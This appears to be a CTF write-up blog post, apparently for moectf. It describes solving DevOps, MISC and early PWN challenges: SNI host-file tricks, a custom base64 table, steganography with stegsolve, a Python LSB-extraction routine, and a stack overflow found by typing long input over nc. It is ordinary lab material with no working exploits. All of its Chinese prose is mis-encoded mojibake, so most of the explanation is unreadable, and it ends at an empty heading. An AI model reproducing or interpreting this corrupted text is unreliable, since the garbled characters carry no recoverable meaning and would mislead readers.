<p>ç”µåŠ¨æœºæ¥å¥½ç”µæºå, åœ¨ä¸€æ®µæ”¾ç½®ä¸€ä¸ªæ‹¨ç‰‡,è®©å…¶æ¯è½¬ä¸€åœˆæ‹¨ç‰‡éƒ½ä¼šæ‹¨ä¸€ä¸‹æ£‰ç­¾, æœ€åæŠŠæ‰‹æœºæ”¾åœ¨æ£‰ç­¾å¤´ä¸‹é¢, æ‰“å¼€å¼€å…³, ç¡è§‰.</p>
<p>ç¬¬äºŒå¤©æ—©ä¸Šèµ·æ¥å°±å¯ä»¥äº¤<code>flag</code>äº†.</p>
<h2 id="devops">DevOps</h2>
<h3 id="sni">SNI</h3>
<p>è¿™é“é¢˜æ‹¿ç«ç‹æ‰“å¼€å¯ä»¥å‘ç°è¯ä¹¦åªé€‚ç”¨äº<code>*.sspirits.top</code>, äºæ˜¯ä¿®æ”¹<code>hosts</code>æ–‡ä»¶å†ä¿®æ”¹HTTPè¯·æ±‚å¤´çš„Host, ç„¶åå°±æ‹¿åˆ°äº†<code>flag</code> ( ä½†æ˜¯æˆ‘é‡æ–°åšçš„æ—¶å€™å‘ç°ä¸å¯¹äº†&hellip; æˆ‘ä¹Ÿå¾ˆç–‘æƒ‘ )</p>
<h3 id="sni-1">SNI++</h3>
<p>è¿™é“é¢˜å¥½åƒå¾ˆå¥½åš..é¢˜ç›®çš„åœ°å€: <code>176.9.166.200</code></p>
<p>æˆ‘ä½¿ç”¨äº†<code>nslookup</code>, ç„¶ååæŸ¥åˆ°äº†åŸŸå:</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">200.166.9.176.in-addr.arpa      name = vps.stockservers.com.
</span></span></code></pre></div><p>ç„¶åä¿®æ”¹<code>hosts</code>æ–‡ä»¶,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">176.9.166.200 vps.stockservers.com
</span></span></code></pre></div><p>ç„¶ååˆ·æ–°ç½‘ç»œå†ç”¨ç«ç‹æ‰“å¼€, çœ‹åˆ°è¯ä¹¦ä¸åŒ¹é…çš„å®‰å…¨è­¦å‘Šç‚¹å‡»è·³è¿‡, ç„¶åå°±æ‹¿åˆ°äº†<code>flag</code>.</p>
<h2 id="misc">MISC</h2>
<h3 id="ä¸–ç•Œè¾£ä¹ˆå¤§">ä¸–ç•Œè¾£ä¹ˆå¤§</h3>
<p>å°±æŠŠç¨‹åºæ‹‰å¼€å°±è¡Œäº†, ç¨‹åºçª—å£å¤§å°å¯å˜.</p>
<h3 id="easy-base64">Easy base64</h3>
<p>æ‰”è¿›åœ¨çº¿è§£å¯†ç½‘ç«™é‡Œ.</p>
<h3 id="ç½‘çº¿å¤§é²¨é±¼">ç½‘çº¿å¤§é²¨é±¼</h3>
<p>æ‹¿<code>WireShark</code>æ‰“å¼€, ç„¶åå¯¼å‡ºæ•°æ®, åœ¨æ–‡ä»¶åé‚£é‡Œå°±å¯ä»¥çœ‹è§<code>flag</code>.</p>
<h3 id="ä½ çš„è„‘æ´å¤Ÿå¤§å—">ä½ çš„è„‘æ´å¤Ÿå¤§å—</h3>
<p>è¿™é“é¢˜!!!</p>
<p>å…ˆä¸‹è½½ç¨‹åº, æ‰“å¼€åå»å“ªé‡Œæ‰¾key, ç„¶åç»™äº†ä¸€ä¸²æ•°å­—, è¯´ç½‘ç»œæƒ…ç¼˜ä¸€çº¿ç‰µ.</p>
<p>ç½‘ç»œæƒ…ç¼˜ä¸€çº¿ç‰µæƒ³åˆ°äº†QQå·, ç„¶åæ‰“å¼€QQæ·»åŠ å¥½å‹, ç„¶ååœ¨ä¸»é¡µç…§ç‰‡å¢™çœ‹è§å¦ä¸€ä¸ªå¤§ä½¬çš„QQå·, å¼€äº†ä¸€å †ä¼šå‘˜.. æŠŠQQå¤åˆ¶ä¸‹æ¥ç²˜è´´è¿›keyé‡Œé¢, å‘ç°ä¸å¯¹. æœç´¢è¿™ä¸ªäººçš„QQ, å‘ç°æ²¡æœ‰ä»€ä¹ˆä¿¡æ¯, åªæœ‰ä¸ªäººè¯´æ˜ä¸Šæœ‰ä¿©ç½‘å€, æ˜¯åƒé¸¡é€è§†å¤–æŒ‚çš„ç½‘å€. äºæ˜¯å›åˆ°æœ€å¼€å§‹çš„QQè´¦å·, ç‚¹å‡»æ·»åŠ å¥½å‹, åœ¨éªŒè¯é—®é¢˜ä¸Šçœ‹åˆ°äº†XDSECçš„å¤§ä½¬ID, æ˜ç™½è¿™è‚¯å®šæ˜¯Key, å¤åˆ¶ä¸‹æ¥æ”¾è¿›Key, ç‚¹äº†ä¸€ä¸‹æç¤ºç™¾æœµäº‘ä¸­å®šæœ‰ä¸ä¸€æ ·çš„é¢œè‰², äºæ˜¯æ‰“å¼€ç™¾åº¦äº‘, æŠŠè¾“å…¥æ¡†é‡Œäº§ç”Ÿçš„é‚£ä¸²ä¹±ç ç²˜è´´åˆ°ç™¾åº¦ç½‘ç›˜åˆ†äº«åœ°å€é‡Œ, ç„¶åæ‰“å¼€å‘ç°éœ€è¦æå–ç . æƒ³èµ·æ¥é¢˜ç›®ä¸Šç»™çš„æå–ç  <code>2m54</code> , è¾“è¿›å», æœç„¶æ˜¯å¯¹çš„. ä¸‹è½½å¾—åˆ°ä¸€ä¸ªå‹ç¼©åŒ….è§£å‹åå‘ç°ä¸€ä¸ªè„šæœ¬å’Œä¸€ä¸ªtxt, æç¤ºè¯´å¤šä¸€ä¸ª1ä¹Ÿç®—å¤±è¯¯. ç„¶åæ‰“å¼€è„šæœ¬å­—ä¸²å»æ‰å¼€å¤´çš„1, å‰©ä¸‹æ‰”è¿›base64, è§£å‡ºå¾—åˆ°<code>flag</code>. ( è¿™æ˜¯æˆ‘åšè¿‡æœ€åƒé»‘å®¢çš„ä¸€é“é¢˜, ç¡®å®å¾ˆè€ƒè„‘æ´ä½†æ˜¯å¾ˆå¥½ç©, å¯Œæœ‰æŒ‘æˆ˜æ€§. )</p>
<h3 id="è¢«ä¼ªåŠ å¯†çš„æ–‡æ¡£">è¢«ä¼ªåŠ å¯†çš„æ–‡æ¡£</h3>
<p>è¯´æ¥å·§, å‰å‡ å¤©ä¸‹è½½æ³¨å†Œæœº, ç„¶åä¸€ä¸å°å¿ƒç»™ç”µè„‘ä¸Šè£…äº†360å…¨å®¶æ¡¶, ç„¶ååˆ è½¯ä»¶æ—¶æ²¡åˆ å®Œ, ä¸å°å¿ƒç•™äº†ä¸ª360å‹ç¼©&hellip; ç„¶ååšè¿™é¢˜çš„æ—¶å€™å‹ç¼©åŒ…å°±ç›´æ¥æ­£å¸¸è§£å‹äº†!</p>
<p>ç„¶åå°±æ‹¿åˆ°<code>flag</code>äº†&hellip; ä»é‚£ä»¥åæˆ‘è§‰å¾—360å‹ç¼©å°±ç•™åœ¨ç”µè„‘é‡Œå§&hellip;</p>
<p>æ­£å¸¸åšæ³•æ˜¯ä¿®æ”¹zipæ–‡ä»¶çš„hexç , ç„¶åæŠŠæ ‡è¯†æ˜¯å¦åŠ å¯†çš„é‚£ä¸ªä½ç»™æ”¹è¿‡æ¥.</p>
<h3 id="ä¿®å¤åˆ†ç¦»">ä¿®å¤&amp;åˆ†ç¦»</h3>
<p>ç”¨PSæ‰“å¼€å›¾ç‰‡å‘ç°å‰åŠä¸ª<code>flag</code>, ç„¶åæ‹–è¿›<code>Linux</code>ç”¨<code>binwalk</code>è·‘äº†ä¸€ä¸‹å‘ç°æœ‰å‹ç¼©åŒ…åç¼€, å°±å¼ºè¡Œæ”¹æˆ<code>zip</code>æ‰“å¼€, é‡Œé¢æœ‰ä¸€<code>txt</code>, è§£å‹å¾—åˆ°ååŠä¸ª<code>flag</code>.</p>
<h3 id="keyboard">Keyboard</h3>
<p>è¿™é“é¢˜ä¸ç”¨é¢˜è§£äº†å§&hellip; å°±è·Ÿç€æ–‡ä»¶é‡Œçš„æŒ‰é”®é¡ºåºæŒ‰ä¸€éå°±å¥½äº†&hellip;.</p>
<h3 id="æ¼äººçš„aliga">æ¼äººçš„Aliga</h3>
<p>çˆ±é…±æ˜¯çœŸçš„æ¼‚äº®!</p>
<p>å¥½å§è¿™ä¸æ˜¯é‡ç‚¹&hellip; é‡ç‚¹å°±æ˜¯&hellip; ä½ é€‰ä¸­å›¾ç‰‡æœ€ä¸‹é¢æ²¡æœ‰<code>aliga</code>éƒ¨åˆ†, ç„¶åæ‹‰ä¼¸å˜å½¢å¯ä»¥å¾—åˆ°ä¸€ä¸ªæ¡å½¢ç ..ä½†æ˜¯å’§, æ¡å½¢ç æ‰«ä¸å‡ºæ¥&hellip; åæ¥åˆ†æä¸€ä¸‹å‘ç°è¾¹ç•Œæ˜¯ç™½æ¡, è¿™æ˜¾ç„¶ä¸æ˜¯æ¡å½¢ç åº”è¯¥æœ‰çš„æ ·å­, å°±å¤„ç†æˆåç›¸ç„¶åæ‹¿å¾®ä¿¡æ‰«ä¸€æ‰«è·å–<code>flag</code>.</p>
<h3 id="secret-code">Secret Code</h3>
<p>è¿™ä¸ªé¢˜å˜›..ä¹Ÿæ˜¯ç¤¾å·¥, æˆ‘è¿˜ä¹°äº†hint&hellip;</p>
<p>æŠŠä»£ç <code>base64</code>è§£å¯†å¾—åˆ°ä¸€ä¸²ä¹±ç , åŠ ä¸Šä»å›§å§å§çš„ä¸»é¡µçœ‹è§çš„é…·ä¼¼æå–ç çš„ä¸œè¥¿, äºæ˜¯å†åº¦æ‰“å¼€ç™¾åº¦äº‘&hellip; ç„¶åçœ‹è§äº†å¸…æ°”çš„PWNçˆ·s@d. æ‹–è¿›<code>WinHex</code>, æœç´¢<code>moectf</code>æ‰¾åˆ°<code>flag</code>.</p>
<h3 id="base64">Base64?</h3>
<p>å“‡å¡è¿™é“é¢˜æ˜¯çœŸçš„åšäº†å¾ˆä¹…å¾ˆä¹…&hellip;</p>
<p>å…¶å®æ˜¯è€ƒçš„æ˜¯Base64çš„åŸç†, ä¸Šç½‘<code>bing</code>äº†ä¸€ä¸‹, å¤§è‡´å°±æ˜¯æŠŠå­—ç¬¦å˜æˆäºŒè¿›åˆ¶ä¸²ç„¶åé‡æ–°åˆ†ç»„é‡æ–°æ–­å¥, å°±å¾ˆç¥å¥‡&hellip;</p>
<p>å…ˆç»™<code>table</code>ç¼–å·,</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-text" data-lang="text"><span class="line"><span class="cl">00000000 x
</span></span><span class="line"><span class="cl">00000001 y
</span></span><span class="line"><span class="cl">00000010 U
</span></span><span class="line"><span class="cl">00000011 V
</span></span><span class="line"><span class="cl">00000100 z
</span></span><span class="line"><span class="cl">00000101 A
</span></span><span class="line"><span class="cl">00000110 B
</span></span><span class="line"><span class="cl">00000111 C
</span></span><span class="line"><span class="cl">00001000 D
</span></span><span class="line"><span class="cl">00001001 E
</span></span><span class="line"><span class="cl">00001010 F
</span></span><span class="line"><span class="cl">00001011 G
</span></span><span class="line"><span class="cl">00001100 H
</span></span><span class="line"><span class="cl">00001101 I
</span></span><span class="line"><span class="cl">00001110 J
</span></span><span class="line"><span class="cl">00001111 K
</span></span><span class="line"><span class="cl">00010000 L
</span></span><span class="line"><span class="cl">00010001 M
</span></span><span class="line"><span class="cl">00010010 N
</span></span><span class="line"><span class="cl">00010011 O
</span></span><span class="line"><span class="cl">00010100 a
</span></span><span class="line"><span class="cl">00010101 b
</span></span><span class="line"><span class="cl">00010110 c
</span></span><span class="line"><span class="cl">00010111 d
</span></span><span class="line"><span class="cl">00011000 e
</span></span><span class="line"><span class="cl">00011001 f
</span></span><span class="line"><span class="cl">00011010 g
</span></span><span class="line"><span class="cl">00011011 h
</span></span><span class="line"><span class="cl">00011100 i
</span></span><span class="line"><span class="cl">00011101 j
</span></span><span class="line"><span class="cl">00011110 k
</span></span><span class="line"><span class="cl">00011111 l
</span></span><span class="line"><span class="cl">00100000 m
</span></span><span class="line"><span class="cl">00100001 W
</span></span><span class="line"><span class="cl">00100010 X
</span></span><span class="line"><span class="cl">00100011 Y
</span></span><span class="line"><span class="cl">00100100 Z
</span></span><span class="line"><span class="cl">00100101 0
</span></span><span class="line"><span class="cl">00100110 1
</span></span><span class="line"><span class="cl">00100111 2
</span></span><span class="line"><span class="cl">00101000 3
</span></span><span class="line"><span class="cl">00101001 4
</span></span><span class="line"><span class="cl">00101010 5
</span></span><span class="line"><span class="cl">00101011 6
</span></span><span class="line"><span class="cl">00101100 7
</span></span><span class="line"><span class="cl">00101101 8
</span></span><span class="line"><span class="cl">00101110 9
</span></span><span class="line"><span class="cl">00101111 P
</span></span><span class="line"><span class="cl">00110000 Q
</span></span><span class="line"><span class="cl">00110001 R
</span></span><span class="line"><span class="cl">00110010 S
</span></span><span class="line"><span class="cl">00110011 T
</span></span><span class="line"><span class="cl">00110100 n
</span></span><span class="line"><span class="cl">00110101 o
</span></span><span class="line"><span class="cl">00110110 p
</span></span><span class="line"><span class="cl">00110111 q
</span></span><span class="line"><span class="cl">00111000 r
</span></span><span class="line"><span class="cl">00111001 s
</span></span><span class="line"><span class="cl">00111010 t
</span></span><span class="line"><span class="cl">00111011 u
</span></span><span class="line"><span class="cl">00111100 v
</span></span><span class="line"><span class="cl">00111101 w
</span></span></code></pre></div><p>ç¼–å¥½ä¹‹å, å°±å¯ä»¥é€šè¿‡æŸ¥è¡¨çš„æ–¹å¼æŠŠå¯†æ–‡ç¿»è¯‘æˆäºŒè¿›åˆ¶å½¢å¼, ç„¶åæŠŠæ¯ä¸€æ®µäºŒè¿›åˆ¶çš„å‰ä¸¤ä½0ç»™å»æ‰, é‡æ–°æŒ‰ç…§å…«ä½åˆ†ç»„, å¯¹ç…§ASCIIè¡¨å°±å¯ä»¥ç¿»è¯‘å‡ºæ¥. è¿™é“é¢˜æ˜¯åœ¨ç«è½¦ä¸Šå†™çš„, å°±çº¯æ‰‹æ’•äº†&hellip; æ²¡æœ‰ä»£ç .. ä¸è¿‡æŸ¥è¡¨å’Œé‡æ–°æ‹¼æ¥çš„ä»£ç å®ç°åº”è¯¥ä¸æ€ä¹ˆéš¾&hellip;</p>
<h3 id="aiaiai">AiAiAi</h3>
<p>ä½œä¸ºç¬¬ä¸€ä¸ªåšå‡ºæ¥è¿™é“é¢˜çš„äºº! æˆ‘è¦å¥½å¥½éª„å‚²ä¸€ä¼šå„¿!</p>
<p>è¿™é“é¢˜å…¶å®å°±æ˜¯éŸ³é¢‘éšå†™. ä»<code>Ardour</code>çš„é¢‘è°±ä¸Šå¯ä»¥å¾ˆæ¸…æ¥šçš„çœ‹è§å°¾éƒ¨æœ‰ä¸œè¥¿..</p>
<p>äºæ˜¯æ”¾å¤§äº†çœ‹, å‘ç°ä¸€äº›é…·ä¼¼è«å°”æ–¯ç”µç çš„ä¸œè¥¿, è§£ç æäº¤.</p>
<h3 id="osu-master">Osu Master</h3>
<p>å°±æŠŠè¿™é¢˜ç©è¿‡å»å°±è¡Œäº†..</p>
<p>ç”»çš„è½¨è¿¹å°±æ˜¯<code>flag</code>.</p>
<h3 id="sdçš„å˜²è®½è¡¨æƒ…">s@dçš„å˜²è®½è¡¨æƒ…</h3>
<p>è¿™é“é¢˜..</p>
<p>åæ­£æˆ‘PWNçˆ·æœ€å¸…å‘—&hellip;</p>
<p>ä¸‹è½½äº†å›¾ç‰‡æ‹¿<code>stegsolve</code>æ‰“å¼€, æå–æ•°æ®é€‰æ‹©<code>RGB</code>çš„æœ€ä½ä½, <code>LSB First</code>, ç„¶åæ–¹å¼é€‰æ‹©<code>BGR</code>, ç‚¹å‡»<code>Preview</code>, å°±å¯ä»¥çœ‹è§<code>flag</code>äº†&hellip;</p>
<h3 id="kokoro">Kokoro</h3>
<p>è¿™é¢˜éœ€è¦ä¸€ä¸ªç”·æœ‹å‹ ( BF )ğŸ™ƒ</p>
<p>BFå°±æ˜¯<code>BrainFuck</code>å•¦&hellip;.æƒ³ä»€ä¹ˆå‘¢</p>
<p>æ‰“å¼€æ–‡ä»¶ä¹‹åæ‰‹åŠ¨å±•å¼€, å¦‚æœæ˜¯ 20. ,å±•å¼€ä¹‹åå°±æ˜¯20ä¸ª . ,ä»¥æ­¤ç±»æ¨, å…¨éƒ¨å±•å¼€äº†æ‰”è¿›Ook! ç¼–ç è§£ç å™¨é‡Œè§£å‡ºæ¥<code>flag</code>.</p>
<h3 id="show-off">Show Off</h3>
<p>æœ€åä¸€é¢˜äº†QAQ</p>
<p>å†™å®Œç¡è§‰!</p>
<p>è¿™é“é¢˜æˆ‘æ“¦äºŒç»´ç æ“¦äº†ä¸€ä¸‹åˆæ‰æ“¦å¹²å‡€&hellip;</p>
<p>ç„¶åå°±æƒ³æ–¹è®¾æ³•åœ°å®ç°è¿™ä¸ªå‡½æ•°äº†â€¦</p>
<p>æœ€åå€Ÿé‰´äº†å¤§ä½¬çš„ä½œå“, æ‰å‹‰å¼ºæŠŠè¿™é¢˜å¼„å‡ºæ¥..</p>
<p>ç”¨<code>stegsolve</code>æ‰“å¼€äºŒç»´ç è¿›è¡Œé¢‘ç‡åˆ†æå¯ä»¥å¾—åˆ°ä»£ç é‡Œçš„<code>dic</code>, ç„¶å</p>
<div class="highlight"><pre tabindex="0" class="chroma"><code class="language-python" data-lang="python"><span class="line"><span class="cl"><span class="k">def</span> <span class="nf">read</span><span class="p">(</span><span class="bp">self</span><span class="p">,</span> <span class="n">bit</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># implement this</span>
</span></span><span class="line"><span class="cl">    <span class="c1"># è¯·å®ç°è¿™ä¸€å‡½æ•°</span>
</span></span><span class="line"><span class="cl">    <span class="n">index</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">    <span class="n">data</span> <span class="o">=</span> <span class="s1">&#39;&#39;</span>
</span></span><span class="line"><span class="cl">    <span class="n">dic</span> <span class="o">=</span> <span class="p">[</span><span class="mh">0x00</span><span class="p">,</span> <span class="mh">0xff</span><span class="p">,</span> <span class="mh">0x3f</span><span class="p">,</span> <span class="mh">0xbf</span><span class="p">,</span> <span class="mh">0xfe</span><span class="p">,</span> <span class="mh">0x01</span><span class="p">,</span> <span class="mh">0x40</span><span class="p">,</span> <span class="mh">0xc0</span><span class="p">,</span> <span class="mh">0xcf</span><span class="p">,</span> <span class="mh">0xbe</span><span class="p">,</span> <span class="mh">0x2f</span><span class="p">,</span> <span class="mh">0x3e</span><span class="p">,</span> <span class="mh">0x0f</span><span class="p">,</span> <span class="mh">0x6f</span><span class="p">,</span>
</span></span><span class="line"><span class="cl">           <span class="mh">0xef</span><span class="p">,</span> <span class="mh">0x9f</span><span class="p">,</span> <span class="mh">0x5f</span><span class="p">,</span> <span class="mh">0x8f</span><span class="p">,</span> <span class="mh">0xee</span><span class="p">,</span> <span class="mh">0x30</span><span class="p">,</span> <span class="mh">0x2e</span><span class="p">,</span> <span class="mh">0x90</span><span class="p">,</span> <span class="mh">0x70</span><span class="p">,</span> <span class="mh">0x60</span><span class="p">,</span> <span class="mh">0x8e</span><span class="p">,</span> <span class="mh">0xd0</span><span class="p">,</span> <span class="mh">0x9e</span><span class="p">,</span> <span class="mh">0xce</span><span class="p">]</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">width</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">        <span class="nb">print</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="k">for</span> <span class="n">j</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">height</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">            <span class="n">p</span> <span class="o">=</span> <span class="nb">list</span><span class="p">(</span><span class="bp">self</span><span class="o">.</span><span class="n">im</span><span class="o">.</span><span class="n">getpixel</span><span class="p">((</span><span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">)))</span>
</span></span><span class="line"><span class="cl">            <span class="n">ifx</span> <span class="o">=</span> <span class="n">info</span><span class="o">.</span><span class="n">get</span><span class="p">(</span><span class="n">i</span><span class="o">*</span><span class="mi">10000</span><span class="o">+</span><span class="n">j</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">            <span class="k">if</span> <span class="n">ifx</span> <span class="o">!=</span> <span class="kc">None</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="k">if</span> <span class="n">ifx</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">elif</span> <span class="n">ifx</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                        <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="cl">                    <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;ERROR!&#34;</span><span class="p">,</span> <span class="n">i</span><span class="p">,</span> <span class="n">j</span><span class="p">,</span> <span class="n">k</span><span class="p">,</span> <span class="n">ifx</span><span class="p">,</span> <span class="n">p</span><span class="p">,</span> <span class="n">bit</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                        <span class="n">px</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                        <span class="k">for</span> <span class="n">color</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">color</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                                <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">                                <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                                <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="cl">                                <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                                <span class="k">break</span>
</span></span><span class="line"><span class="cl">                            <span class="k">if</span> <span class="n">px</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                                <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not sel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                                <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">                        <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">            <span class="k">else</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                <span class="k">for</span> <span class="n">k</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">3</span><span class="p">):</span>
</span></span><span class="line"><span class="cl">                    <span class="n">px</span> <span class="o">=</span> <span class="mi">0</span>
</span></span><span class="line"><span class="cl">                    <span class="k">for</span> <span class="n">color</span> <span class="ow">in</span> <span class="n">dic</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">color</span> <span class="o">|</span> <span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;1&#39;</span>
</span></span><span class="line"><span class="cl">                            <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">                            <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">color</span> <span class="o">&amp;</span> <span class="o">~</span><span class="p">(</span><span class="mi">1</span> <span class="o">&lt;&lt;</span> <span class="n">bit</span><span class="p">)</span> <span class="o">==</span> <span class="n">p</span><span class="p">[</span><span class="n">k</span><span class="p">]:</span>
</span></span><span class="line"><span class="cl">                            <span class="n">data</span> <span class="o">+=</span> <span class="s1">&#39;0&#39;</span>
</span></span><span class="line"><span class="cl">                            <span class="n">bit</span> <span class="o">=</span> <span class="p">(</span><span class="n">bit</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span>
</span></span><span class="line"><span class="cl">                            <span class="n">px</span> <span class="o">=</span> <span class="mi">1</span>
</span></span><span class="line"><span class="cl">                            <span class="k">break</span>
</span></span><span class="line"><span class="cl">                        <span class="k">if</span> <span class="n">px</span> <span class="o">==</span> <span class="mi">0</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">                            <span class="nb">print</span><span class="p">(</span><span class="s2">&#34;not sel&#34;</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">                            <span class="n">exit</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="n">dat</span> <span class="o">=</span> <span class="nb">bytearray</span><span class="p">()</span>
</span></span><span class="line"><span class="cl">    <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="nb">int</span><span class="p">((</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span><span class="o">-</span><span class="nb">len</span><span class="p">(</span><span class="n">data</span><span class="p">)</span> <span class="o">%</span> <span class="mi">8</span><span class="p">)</span><span class="o">/</span><span class="mi">8</span><span class="p">)):</span>
</span></span><span class="line"><span class="cl">        <span class="n">inx</span> <span class="o">=</span> <span class="nb">int</span><span class="p">(</span><span class="n">data</span><span class="p">[</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="p">:</span><span class="n">i</span><span class="o">*</span><span class="mi">8</span><span class="o">+</span><span class="mi">8</span><span class="p">],</span> <span class="mi">2</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">        <span class="n">dat</span><span class="o">.</span><span class="n">append</span><span class="p">(</span><span class="n">inx</span><span class="p">)</span>
</span></span><span class="line"><span class="cl">    <span class="k">with</span> <span class="nb">open</span><span class="p">(</span><span class="s1">&#39;flag1.jpg&#39;</span><span class="p">,</span> <span class="s1">&#39;wb&#39;</span><span class="p">)</span> <span class="k">as</span> <span class="n">f</span><span class="p">:</span>
</span></span><span class="line"><span class="cl">        <span class="n">f</span><span class="o">.</span><span class="n">write</span><span class="p">(</span><span class="n">dat</span><span class="p">)</span>
</span></span></code></pre></div><p>ç„¶åæŠŠç”Ÿæˆçš„å›¾ç‰‡æ‹–è¿›<code>WinHex</code>é‡Œ, å°±èƒ½çœ‹è§<code>flag</code>äº†.</p>
<h2 id="pwn">PWN</h2>
<h3 id="æ¬¢è¿æ¥åˆ°pwnçš„ä¸–ç•Œ">æ¬¢è¿æ¥åˆ°pwnçš„ä¸–ç•Œ</h3>
<p>è¿™é“é¢˜è¦ç”¨<code>nc</code>, æˆ‘å°±å¤åˆ¶ç²˜è´´è¿›äº†ç»ˆç«¯, ç„¶åå›è½¦, æç¤ºä¸è¦è¾“å…¥å¤ªå¤šå­—æ¯, ç„¶åæˆ‘ç™¾åº¦äº†å¥½ä¹…ä¹Ÿæ²¡å¼„æ‡‚<code>PWN</code>ä¸ºä½•ç‰©,äºæ˜¯.. åœ¨æŸä¸ªæœˆé»‘é£é«˜çš„å¤œæ™šæˆ‘ç»æœ›çš„è„¸æ»šé”®ç›˜, æ»šäº†å¥½å¤šè¾“å…¥, ç„¶åå°±çœ‹è§<code>flag</code>è¹¦äº†å‡ºæ¥&hellip; åé¢è¿˜è·Ÿäº†ä¸€ä¸ªæ ˆæº¢å‡ºçš„æç¤º&hellip;</p>
<p>WD**D, <code>pwn</code>æ˜¯è¿™ä¹ˆç©çš„å•Š!</p>
<h3 id="pwn1">pwn1</h3>
